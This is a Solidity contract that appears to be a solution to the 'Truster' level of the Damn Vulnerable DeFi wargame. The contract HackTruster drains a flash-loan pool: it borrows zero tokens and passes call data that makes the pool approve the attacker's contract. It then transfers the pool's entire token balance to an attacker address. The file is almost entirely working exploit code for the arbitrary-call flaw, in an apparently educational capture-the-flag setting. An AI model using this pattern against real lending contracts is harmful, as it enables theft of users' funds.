// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./TrusterLenderPool.sol";


contract HackTruster {
    
    IERC20 public immutable damnValuableToken;
    TrusterLenderPool private immutable pool;

    constructor (address tokenAddress, address poolAddress) {
        damnValuableToken = IERC20(tokenAddress);
        pool = TrusterLenderPool(poolAddress);
    }

    function hack(address attacker) public {
        
        // Get the balance of DVT held by the pool
        uint256 balance = damnValuableToken.balanceOf(address(pool));

        // Flash loan 0 DVT and call approve method to allow the attacker to transfer balance DVT from the pool
        pool.flashLoan(
            0,
            attacker,
            address(damnValuableToken),
            abi.encodeWithSignature("approve(address,uint256)", address(this), balance)
        );

        // Use transferFrom to transfer balance DVT from pool to attacker
        damnValuableToken.transferFrom(address(pool), attacker, balance);

    }

}